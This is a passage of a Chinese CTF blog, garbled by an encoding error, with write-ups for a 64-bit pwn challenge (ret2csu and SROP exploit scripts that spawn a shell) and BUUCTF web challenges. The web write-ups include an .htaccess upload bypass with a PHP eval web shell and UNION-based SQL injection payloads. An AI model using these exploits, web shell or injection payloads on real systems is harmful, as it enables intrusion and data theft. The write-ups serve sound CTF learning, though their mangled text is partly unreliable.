æ±‡ç¼–æŒ‡ä»¤è°ƒç”¨ã€‚ é¢˜ç›®é“¾æ¥ è¿™é¢˜æˆ‘æ˜¯æˆ‘ä¸ä¼šåšçš„ğŸ¤¡ï¼Œè‡³å°‘åœ¨çœ‹åˆ«äººçš„åšå®¢ä¹‹å‰æ˜¯è¿™æ ·ã€‚è€Œä¸”ï¼Œåœ¨æŸ¥é˜…äº†ä¼—å¤šèµ„æ–™ä»¥åŠè‡ªå·±è·Ÿç€gdbè°ƒè¯•ä¹‹åï¼Œæ‰ç»ˆäºå¼„æ‡‚äº†è¿™é¢˜çš„ä¸€ç§è§£æ³•ã€‚æ‰€ä»¥ï¼Œä¸ºäº†åŠ æ·±ç†è§£ï¼Œåœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹å‡è£…æ˜¯è‡ªå·±åšå‡ºæ¥çš„è‡ªå·±å¤ç°çš„è§£é¢˜è¿‡ç¨‹å§ã€‚ğŸ˜… ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:1:0","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x00-å‰è¨€"},{"categories":["CTF"],"content":"0x01 å¼€å§‹åˆ†æ é¦–å…ˆchecksec Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64ä½ï¼Œæ²¡å¼€PIEï¼Œæ²¡æœ‰cannaryï¼Œå¼€äº†NXï¼ˆè¯´æ˜ä¸èƒ½ç›´æ¥å†™shellcodeï¼‰ã€‚ IDAçœ‹ä¸€ä¸‹ï¼Œvuln()å’Œgadgets()å¾ˆæ˜¾çœ¼å•Šï¼Œçœ‹ç€è¿™å‡½æ•°åå½“æ—¶å¿ƒæƒ³è¿™ä¼°è®¡åˆæ˜¯ä¸€é“ç®€ç®€å•å•çš„åŸºç¡€ropè®­ç»ƒï¼Œä¸”çœ‹æˆ‘10åˆ†é’Ÿæ‹¿ä¸‹ğŸ¤£é‚£å°±åˆ†åˆ«å»çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°çš„å†…å®¹å§ã€‚ é¦–å…ˆæ˜¯vuln()ã€‚å‘ç°å…¶ä¸­è°ƒç”¨äº†sys_read()å’Œsys_write()ï¼Œéƒ½æ˜¯ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼ã€‚è€Œä¸”sys_read()å‘å¤§å°ä¸º0x10çš„bufå†™å…¥æœ€å¤š0x400ä¸ªæ•°ï¼Œè¿™æ˜¾ç„¶å­˜åœ¨æº¢å‡ºã€‚ vuln()å‡½æ•°image-20210827140902790 \" vuln()å‡½æ•° ç„¶åæ˜¯gadgets()ã€‚å…¶ä¸­å­˜åœ¨ä¸¤ä¸ªè®¾ç½®raxå¯„å­˜å™¨çš„gadgetï¼ŒæŸ¥ä¸€ä¸‹64ä½Linuxç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œ0x0fæ˜¯sigreturnï¼Œ0x3bæ˜¯execveã€‚å†ç»“åˆvuln()ä¸­å­˜åœ¨syscallè¯­å¥ï¼Œå°±å¯ä»¥ç¡®å®šæœ€æ˜æ˜¾çš„æ€è·¯äº†ï¼Œé‚£å°±æ˜¯æƒ³åŠæ³•è°ƒç”¨execve(\"/bin/sh\", NULL, NULL)æ¥è·å–shellã€‚ gadgetsimage-20210827142815042 \" gadgets æ ¹æ®å‰è¨€æåˆ°çš„64ä½Linuxç³»ç»Ÿè°ƒç”¨çš„ä¼ å‚æ–¹å¼ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨syscallä¹‹å‰éœ€è¦å®Œæˆä¸¤ç‚¹ï¼š raxå¯„å­˜å™¨ç½®ä¸º0x3b(59) rdiè®¾ä¸º/bin/shå­—ç¬¦ä¸²çš„åœ°å€ï¼Œrsi/rdxè®¾ä¸º0 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:2:0","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x01-å¼€å§‹åˆ†æ"},{"categories":["CTF"],"content":"0x02 execve/ret2csuè§£æ³• é¦–å…ˆè¦æƒ³ä¸€ä¸‹æ€ä¹ˆè·å–æŒ‡å‘å­—ç¬¦ä¸²/bin/shçš„åœ°å€ã€‚IDA view-\u003eopen subviews-\u003estringsæŸ¥çœ‹ï¼Œå‘ç°æ²¡æœ‰/bin/shã€‚æ‰€ä»¥åªèƒ½è°ƒsys_read()è‡ªå·±å†™äº†ã€‚åŒæ—¶ï¼Œæ³¨æ„åˆ°**vuln()å‡½æ•°çš„ç»“å°¾æ˜¯æ²¡æœ‰leaveæŒ‡ä»¤çš„**ï¼Œæ‰€ä»¥vlun()è¢«è°ƒç”¨å®Œä¹‹åå…¶å‡½æ•°æ ˆå¹¶æ²¡æœ‰è¢«æ¸…ç©ºï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥å†™/bin/shåœ¨æ ˆä¸Šï¼Œè€Œä¸”è¦†ç›–çš„æ—¶å€™è¦†ç›–çš„rbpå°±ç›´æ¥æ˜¯è¿”å›åœ°å€ã€‚ é‚£ä¹ˆç¬¬äºŒä¸ªé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•çŸ¥é“vuln()å‡½æ•°æ ˆçš„åœ°å€å‘¢ï¼Œç­”æ¡ˆå°±æ˜¯åˆ©ç”¨vuln()ä¸­çš„sys_write()è°ƒç”¨ã€‚è¯¥è°ƒç”¨è¾“å‡º0x30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œbufåœ¨æ ˆä¸Šçš„åœ°å€ä¸º0xdf30ï¼Œè€Œä»æºç å¯çŸ¥å®ƒä¸rbpçš„è·ç¦»ä¸º0x10ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥sys_write()è¾“å‡ºçš„ç¬¬0x21~0x28ä¸ªå­—èŠ‚æ˜¯å¯æ‰§è¡Œæ–‡ä»¶åçš„åœ°å€ï¼Œè¾“å‡ºå†…å®¹ä¸bufåœ°å€çš„åç§»ä¸º0xe048-0xdf30=0x118=280ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ³„éœ²å¯æ‰§è¡Œæ–‡ä»¶ååœ°å€çš„æ–¹å¼æ¥è·å–bufçš„åœ°å€ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œé¢˜ç›®è¯´æ˜äº†è¯¥é¢˜çš„è¿œç¨‹ç¯å¢ƒä¸ºUbuntu18ï¼Œè€Œæˆ‘ä¸€å¼€å§‹æ˜¯ç”¨Ubuntu20è°ƒè¯•çš„ï¼Œæ‰€ä»¥å¾—åˆ°çš„åç§»ä¸º0x128ï¼Œå¤šäº†0x10ä¸ªå­—èŠ‚ï¼Œæˆ‘è¯´æ€ä¹ˆä¸€ç›´ä¸å¯¹ï¼Œåæ¥å†è£…äº†ä¸ªubuntu18çš„wslï¼Œå‘ç°æœç„¶å¦‚æ­¤ï¼Œä¼°è®¡æ˜¯ç³»ç»Ÿçš„åœ°å€å¯¹é½ä¹‹ç±»çš„åŸå› ã€‚æœ‰è¶£çš„æ˜¯ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­è¿˜å­¦ä¹ äº†ä¸€äº›wslçš„æ–°æ“ä½œï¼Œä¹Ÿç®—æ˜¯éœ€æ±‚å¯¼å‘æ€§å­¦ä¹ äº†ï¼Œè®°å½•åœ¨äº†è¿™é‡Œã€‚ wsl-ubuntu18image-20210827112504437 \" wsl-ubuntu18 Ubuntu20ä¸Šé¢çœ‹åˆ°çš„å°±æ˜¯0xdf58-0xde30=0x128=296ã€‚ wsl-ubuntu20image-20210827112608649 \" wsl-ubuntu20 OKï¼Œåœ°å€çŸ¥é“äº†ï¼Œexecve()çš„3ä¸ªå‚æ•°çš„å€¼æˆ‘ä»¬éƒ½èƒ½å¤Ÿç¡®å®šäº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯æ³„éœ²â€™bufâ€™çš„åœ°å€ã€‚ payload1 = b'a'*0x10 + p64(vuln_addr) io.sendline(payload1) io.recv(0x20) stack_addr = u64(io.recv(8)) binsh_addr = stack_addr - 0x118 ä¸Šé¢çš„payload1å‘å®Œä¹‹åï¼Œåˆè¿›å…¥äº†vuln()ã€‚æ¥ä¸‹æ¥çš„å°±æ˜¯é€šè¿‡ç¬¬äºŒä¸ªpayloadæƒ³åŠæ³•æ„é€ ROPé“¾æ¥å®ç°æ§åˆ¶å¯„å­˜å™¨ä¸å‡½æ•°è·³è½¬çš„è¿‡ç¨‹ï¼Œè¿™åˆæ˜¯è¿™é¢˜çš„ä¸€ä¸ªéš¾ç‚¹ï¼ˆå› ä¸ºæˆ‘åšè¿™é¢˜ä¹‹å‰ä¸çŸ¥é“ret2csuğŸ˜¶ï¼‰ã€‚æœ€ç®€å•çš„æ€è·¯é‚£è‚¯å®šæ˜¯ç”¨ROPgadgetæ‰¾åˆ°èƒ½å¤Ÿpopä¸‰ä¸ªå¯„å­˜å™¨ã€ç„¶åretçš„gadgetã€‚ä½†æ˜¯ROPgadgetåªèƒ½æ‰¾åˆ°pop rdiå’Œpop rsiçš„gadgetï¼ˆä¸ºä»€ä¹ˆpop rsi; pop r15; retè¿™æ¡æŒ‡ä»¤ä»ä¸­é—´å¼€å§‹å–å°±æ˜¯pop rdi; retï¼Ÿè¿™æ˜¯æŒ‡ä»¤è®¾è®¡çš„åŸå› å—ï¼Ÿï¼‰ï¼Œè¿˜å·®ä¸€ä¸ªï¼Œæ‰€ä»¥è¿™ç§æ–¹æ³•è¡Œä¸é€šã€‚ 'pop rdx' æ‰¾ä¸åˆ°image-20210827152113322 \" 'pop rdx' æ‰¾ä¸åˆ° å› æ­¤ï¼Œæˆ‘ä»¬å¾—ç”¨ä¸€ç§æ–°çš„retæ–¹å¼ï¼Œret2csuï¼Œå°±æ˜¯åˆ©ç”¨_libc_csu_init()çš„popå’Œmovä¸¤ä¸ªgadgetæ¥å®ç°æ§åˆ¶å¯„å­˜å™¨çš„æ“ä½œï¼Œä¸€èˆ¬é€‚ç”¨äº64ä½çš„é¢˜ç›®ã€‚ret2csuçš„å‚è€ƒèµ„æ–™ç½‘ä¸Šéƒ½æœ‰ï¼Œæ„Ÿè§‰è¿™ç¯‡å†™çš„æŒºæ¸…æ™°çš„ã€‚ ä¸¤æ®µgadgetä¸º //mov .text:0000000000400580 loc_400580: ; CODE XREF: __libc_csu_init+54â†“j .text:0000000000400580 mov rdx, r13 .text:0000000000400583 mov rsi, r14 .text:0000000000400586 mov edi, r15d .text:0000000000400589 call ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8] .text:000000000040058D add rbx, 1 .text:0000000000400591 cmp rbx, rbp .text:0000000000400594 jnz short loc_400580 //pop .text:000000000040059A pop rbx .text:000000000040059B pop rbp .text:000000000040059C pop r12 .text:000000000040059E pop r13 .text:00000000004005A0 pop r14 .text:00000000004005A2 pop r15 .text:00000000004005A4 retn æ€»ç»“ä¸‹æ¥å°±æ˜¯ï¼š r15d -\u003e edi ï¼ˆä¸€èˆ¬æ¥è¯´rdiå¯„å­˜å™¨é«˜8ä½éƒ½æ˜¯0ï¼Œæ‰€ä»¥è¿™é‡Œè™½ç„¶åªæ§åˆ¶äº†ä½8ä½ï¼Œä½†å®é™…ä¸Šç›¸å½“äºå¯ä»¥æ§åˆ¶rdiçš„å€¼ï¼‰ r14 -\u003e rsi r13 -\u003e rdx è¿˜æœ‰ï¼Œrbxè®¾ä¸º0ï¼Œç„¶åcall [r12+rbx*8];å°±ä¼šä»¥r12å­˜å‚¨çš„åœ°å€ä¸ºèµ·ç‚¹å–æŒ‡ä»¤ï¼Œå¹¶ä¸”æ¯æ¬¡å‘åè·³8ä½ï¼Œå› ä¸ºcallæŒ‡ä»¤åä¼šå°†rbxåŠ 1ï¼Œç„¶åå¯¹æ¯”rbpï¼Œå¦‚æœä¸ç›¸ç­‰åˆ™å†æ¬¡å¾ªç¯ äºæ˜¯ï¼Œç†è®ºä¸Šï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ„é€ ä¸€æ®µæå…¶å·§å¦™çš„payload2ï¼š payload2 = b'/bin/sh\\x00'.ljust(0x10, b'a') + p64(pop_rbx_rbp_r12_r13_r14_r15_ret) payload2 += p64(0)*2 + p64(binsh_addr+0x50) + p64(0)*3 payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12) + p64(mov_rax_59_ret) payload2 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(syscall) å¯¹åº”çš„æ‰§è¡Œæµç¨‹ä¸ºï¼š å†™å®Œâ€™/bin/shâ€™ï¼Œvuln()å†…æ‰§è¡Œretnï¼Œè¿›è€Œæ‰§è¡Œpop_rbx_rbp_r12_r13_r14_r15_retã€‚pop6æ¬¡ï¼Œrbx/rbp/r12/r13/r14/r15åˆ†åˆ«è¢«è®¾ä¸º0/0/binsh_addr+0x50/0/0/0/ï¼Œrspæ­¤æ—¶æŒ‡å‘mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12ï¼Œæ¥åœ¨å†retnï¼Œæ‰§è¡Œmov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12ï¼Œæ­¤æ—¶rspæŒ‡å‘mov_rax_59_retï¼Œæ³¨æ„ï¼Œè¿™åˆšå¥½æ˜¯å‰é¢çš„binsh_addr_0x50ğŸ˜¬ mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12æŒ‡ä»¤æ‰§è¡Œï¼Œrsi/rdxè¢«è®¾ç½®ä¸º0ï¼Œç¬¬ä¸€æ¬¡call [r12];ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼ŒcallæŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹æ˜¯å…ˆpushå†jumpï¼Œç„¶åjumpçš„ç›®çš„æŒ‡ä»¤æ®µæœ€åä¸€èˆ¬éƒ½æœ‰ä¸ªretå›æ¥ã€‚æ‰€ä»¥ï¼Œç¬¬ä¸€æ¬¡æ‰§è¡Œcall [r12];ï¼Œå°±ç›¸å½“äºæ‰§è¡Œmov_rax_59_retï¼ŒæŠŠraxè®¾ä¸ºäº†59ï¼Œç„¶åretã€‚ç»è¿‡ä¸€ç•ªpush/retä¹‹åï¼Œrspåˆå›åˆ°äº†mov_rax_59_retçš„ä½ç½®ï¼Œä½†æ­¤æ—¶rbxå·²ç»è¢«åŠ äº†1ï¼Œå€¼å˜ä¸ºäº†1ã€‚ç„¶åé€šè¿‡åé¢çš„cmpåˆ¤æ–­ï¼Œjnzå†æ¬¡è·³å›mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12æŒ‡ä»¤å¼€å¤´ã€‚ å†æ¬¡æ‰§è¡Œmov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12ï¼Œä¸åŒçš„æ˜¯ï¼Œæ­¤æ—¶rbxä¸º1ï¼Œæ‰€ä»¥callæŒ‡ä»¤å˜ä¸ºäº†call [r12+8];ï¼Œæ‰€ä»¥pop_rdi_retè¢«æ‰§è¡Œï¼šcallé¦–å…ˆpushï¼ŒrspæŒ‡å‘callä¹‹åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åjumpï¼›jumpä¹‹åpop rdiï¼Œrdiå˜ä¸ºäº†callçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ŒrspæŒ‡å‘mov_rax_59_retï¼›å†æ¥ç€retï¼ŒrspæŒ‡å‘pop_rdi_retï¼ŒripæŒ‡ä»¤å¯„å­˜å™¨çš„å†…å®¹ä¸ºmov_rax_59_retï¼Œæ‰€ä»¥ç³»ç»Ÿæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸ºmov_rax_59_retã€‚ æ‰§è¡Œmov_rax_59_retï¼ŒrspæŒ‡å‘binsh_addrï¼ŒripæŒ‡ä»¤å¯„å­˜å™¨çš„å†…å®¹ä¸ºpop_rdi_retï¼Œæ‰€ä»¥ç³»ç»Ÿæ‰§è¡Œçš„ä¸‹ä¸€æ¡æŒ‡ä»¤ä¸ºpop_rdi_retã€‚ pop rdi;å°†binsh_addrå†™å…¥rdiï¼Œç„¶åretæ‰§è¡Œsyscallã€‚æ­¤æ—¶ï¼Œraxä¸º59ï¼Œä¸”ä¸‰ä¸ªå¯„å­˜å™¨rdi/rsi/rdxåˆ†åˆ«ä¸ºbinsh_addr/0/0ï¼Œç›¸å½“äºæ‰§è¡Œexecve(\"/bin/sh\", NULL, NULL)ï¼Œæ‹¿åˆ°shellã€‚ æ„Ÿè§‰è¿™ç¯‡åšå®¢é‡Œçš„æ‰§è¡Œæµç¨‹åˆ†æå¥½åƒå†™é”™äº†ä¸€æ­¥â€¦ æœ€ç»ˆå®Œæ•´expå¦‚ä¸‹ã€‚ from pwn import * ï¼› # æœ¬åœ°è°ƒè¯• if args.LOCAL: # context.terminal = [\"wsl\", \"-c\"] # io = process(\"./ciscn_s_3\") io = gdb.debug(\"./ciscn_s_3\") else: io = remote(\"node4.buuoj.cn\", 25280) # context.log_level = 'debug' vuln_addr = 0x4004ed syscall = 0x400517 pop_rdi_ret = 0x4005a3 mov_rax_59_ret = 0x4004e2 pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40059a mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:3:0","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x02-execveret2csuè§£æ³•"},{"categories":["CTF"],"content":"0x03 sigreturn/SROPè§£æ³• è´´ä¸€ä¸‹åˆ«äººçš„expï¼Œç­‰æˆ‘å­¦ä¹ ä¸€ä¸‹SROPå†å›è¿‡å¤´æ¥çœ‹ã€‚ from pwn import * context.arch = 'amd64' p =remote('node3.buuoj.cn',26063)# process('./ciscn_s_3') # e = ELF('./ciscn_s_3') mov_rax_15_ret = 0x4004da vuln_addr = 0x4004ed syscall_addr = 0x400517 payload1 = b'A' * 0x10 + p64(vuln_addr) p.sendline(payload1) p.recv(0x20) stack_leak = u64(p.recv(8)) - 0x118 log.info(\"stack addr: \" + hex(stack_leak)) frame = SigreturnFrame() frame.rax = 0x3b # syscall::execve, constants.SYS_execve is also ok frame.rip = syscall_addr frame.rdi = stack_leak frame.rsi = 0 frame.rdx = 0 payload2 = b'/bin/sh\\x00' + p64(0xdeadbeef) + p64(mov_rax_15_ret) + p64(syscall_addr) + bytes(frame) p.sendline(payload2) p.interactive() ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:4:0","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x03-sigreturnsropè§£æ³•"},{"categories":["CTF"],"content":"0x04 æ€»ç»“ è¿™é¢˜ä»ä¸ä¼šï¼Œåˆ°çœ‹æ‡‚ä¸€ç§è§£æ³•ï¼Œä»¥åŠæŸ¥èµ„æ–™ã€gdbè°ƒè¯•ã€å°è¯•gdb+wsl2+pwntoolsè”åˆè°ƒè¯•ã€å¼„wsl ubuntu18ã€è¿ç§»å ç”¨cç›˜ç©ºé—´å¤ªå¤šçš„wsl2-ubuntu20ã€å†™åšå®¢â€¦ï¼Œå‰å‰ååæäº†å·®ä¸å¤šä¸€å¤©çš„æ—¶é—´ğŸ¤£ï¼Œä¸€ä¸ªå­—ï¼Œç–²æƒ«=.= ä¸è¿‡æ€»çš„æ¥è¯´ï¼Œæ”¶è·è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œç»§ç»­å­¦å§ ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:5:0","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#0x04-æ€»ç»“"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ å…³äº32ä½å’Œ64ä½Linuxçš„ç³»ç»Ÿè°ƒç”¨ x64å¯„å­˜å™¨ä¼ å‚ Ciscn_2019_s_3 ","date":"2021-08-26","objectID":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/:5:1","series":null,"tags":["CTF","pwn"],"title":"è®°å½•ä¸€é“ret2csuçš„pwné¢˜","uri":"/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":"å·²ç»åˆ°ç¬¬4ç¯‡äº†ï¼Œä¸å®¹æ˜“å•Š ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:0:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#"},{"categories":["CTF"],"content":"0x00 [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢ é¢˜ç›®é“¾æ¥ å¼€å¤´çš„æ—¥æœ¬äººç»™æˆ‘å“åˆ°äº†ğŸ˜… ç¬‘å·ã®ç¬‘å®¹image-20210824192847310 \" ç¬‘å·ã®ç¬‘å®¹ è¯•äº†ä¸€ä¸‹ï¼Œphp/php2/php3/phtmlä»€ä¹ˆçš„éƒ½ä¼ ä¸äº†ï¼Œjpgå¯ä»¥ä¼  é‚£ä¹ˆæ€è·¯å°±æ¯”è¾ƒæ˜æ˜¾äº†ï¼Œåˆæ˜¯ä¸Šä¼ .htaccessæˆ–è€….user.iniæ–‡ä»¶æ¥ä½¿å¾—æœåŠ¡ç«¯å°†å›¾ç‰‡ğŸå½“ä½œphpæ–‡ä»¶è§£æã€‚ ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹ï¼š GIF89a \u003cFilesMatch \"leo.jpg\"\u003e SetHandler application/x-httpd-php \u003c/FilesMatch\u003e è¿™ä¸€æ­¥éœ€è¦ç”¨Burpæ‹¦æˆªè¯·æ±‚ï¼Œæ‰‹åŠ¨ä¿®æ”¹Content-Type: application/octet-streamä¸ºContent-Type: image/pngã€‚ ç„¶åä¸Šä¼ leo.jpgï¼Œå…¶ä¸­å†™å…¥ GIF89a \u003cscript language='php'\u003e@eval($_POST['ye']);\u003c/script\u003e èšå‰‘è¿æ¥å³å¯ã€‚ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:1:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x00-mrctf2020ä½ ä¼ ä½ å‘¢"},{"categories":["CTF"],"content":"0x01 [MRCTF2020]Ez_bypass é¢˜ç›®é“¾æ¥ è¿™é¢˜å°±è¿™ï¼Ÿ æ ¹æ®æç¤ºçœ‹phpæºç  I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])\u0026\u0026isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) \u0026\u0026 $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo \"can you think twice??\"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo \"You are not a real hacker!\"; } } else{ die('Please input first'); } }Please input first å­˜åœ¨ä¸¤å±‚éœ€è¦ç»•è¿‡ ç¬¬ä¸€å±‚ï¼Œæ»¡è¶³ä¸¤ä¸ªgetè¯·æ±‚å‚æ•°çš„md5å¼ºç›¸ç­‰ä½†æ˜¯å‚æ•°ä¸ç›¸ç­‰ï¼Œè¿™æ˜¾ç„¶æ˜¯ä¼ æ•°ç»„å‘€ã€‚éœ€è¦è®°ä½çš„æ˜¯ï¼Œå¯¹äºphpåç«¯ï¼Œgetè¯·æ±‚ä¼ é€’æ•°ç»„çš„æ–¹å¼ä¸º/?a[]=1ï¼Œè¿™æ ·ç›¸å½“äºä¼ é€’äº†a = [1]ï¼Œ/?a[]=1\u0026a[]=2åˆ™ç›¸å½“äºä¼ é€’äº†a = [1, 2]ã€‚ md5ç»•è¿‡image-20210825105000448 \" md5ç»•è¿‡ ç¬¬äºŒå±‚è¦æ±‚postçš„å‚æ•°ç»is_numeric()è¿”å›falseï¼Œä½†æ˜¯è¦èƒ½å¤Ÿæ»¡è¶³==1234567ã€‚ç™¾åº¦ä¸€ä¸‹is_numeric()ç»•è¿‡å³å¯ï¼Œæœ€ç®€å•çš„æ–¹å¼å°±æ˜¯postä¸€ä¸ªå­—ç¬¦ä¸²1234567 ï¼Œæ³¨æ„åé¢åŠ äº†ä¸ªç©ºæ ¼ã€‚1234567%00åŒæ ·å¯ä»¥æ»¡è¶³è¦æ±‚ã€‚ is_numericç»•è¿‡image-20210825105341819 \" is_numericç»•è¿‡ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:2:0","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#0x01-mrctf2020ez_bypass"},{"categories":["CTF"],"content":"å‚è€ƒé“¾æ¥ [CTF]php is_numericç»•è¿‡ ","date":"2021-08-24","objectID":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/:2:1","series":null,"tags":["CTF","web"],"title":"BUUCTF Webè®°å½• 4","uri":"/2021-08-24-buuctf-web%E8%AE%B0%E5%BD%95-4/#å‚è€ƒé“¾æ¥"},{"categories":["CTF"],"content":"0x02 [ç½‘é¼æ¯ 2018]Fakebook é¢˜ç›®é“¾æ¥ fakebookï¼Œè‡ªå·±æäº¤ä¿¡æ¯ç„¶åç‚¹joinï¼Œå°±å¯ä»¥åœ¨ç½‘ç«™ä¸Šçœ‹åˆ°ï¼Œè¿™é¢˜åº”è¯¥æ˜¯xsså¥½å§å¹¶ä¸æ˜¯ã€‚ è¯•äº†ä¸€ä¸‹ï¼Œç”¨æˆ·åå¯ä»¥xssã€‚ joinimage-20210825111401320 \" join æ³¨å†Œä¹‹åæäº¤ï¼Œå‘ç°æµè§ˆæ–¹å¼ä¸ºè¯·æ±‚/view.php?no=1ï¼Œçœ‹ä¸€ä¸‹èƒ½ä¸èƒ½æ³¨å…¥ï¼ˆä¸èƒ½åªè®¤ä¸ºè¾“å…¥æ¡†æ‰å­˜åœ¨æ³¨å…¥ï¼‰ã€‚ union selectè¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥ç”¨union/**/selectç»•è¿‡ã€‚å°è¯•ä¹‹åå‘ç°æŸ¥è¯¢è¯­å¥çš„ç»“æœæœ‰4åˆ—ã€‚åŒæ—¶ä¸ºäº†å¾—åˆ°å›æ˜¾ä¿¡æ¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠno=1æ”¹ä¸ºno=-1ï¼Œä½¿å®ƒè‡ªå·±æœ¬èº«çš„æŸ¥è¯¢è¯­å¥æ²¡æœ‰ç»“æœï¼Œè¿™æ ·æ‰èƒ½è®©ç½‘é¡µæ˜¾ç¤ºæ³¨å…¥å†…å®¹çš„å›æ˜¾ã€‚ /view.php?no=-1 union/**/select 1,database(),3,4#å¾—åˆ°æ•°æ®åº“åä¸ºfakebook /view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=\"fakebook\"#å¾—åˆ°fakebookåº“ä¸­æœ‰ä¸ªè¡¨ä¸ºusers /view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=\"users\"#å¾—åˆ°è¡¨usersçš„åˆ—ä¸ºno,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS æ¥ä¸‹æ¥ä¸çŸ¥é“è¯¥å¹²å˜›äº†ã€‚webé¢˜ä¸çŸ¥é“å¹²å˜›çš„è¯å°±å…ˆæ‰«ä¸€ä¸‹ç›®å½•å§ã€‚ dirsearchæ‰«å‡ºæ¥æºç 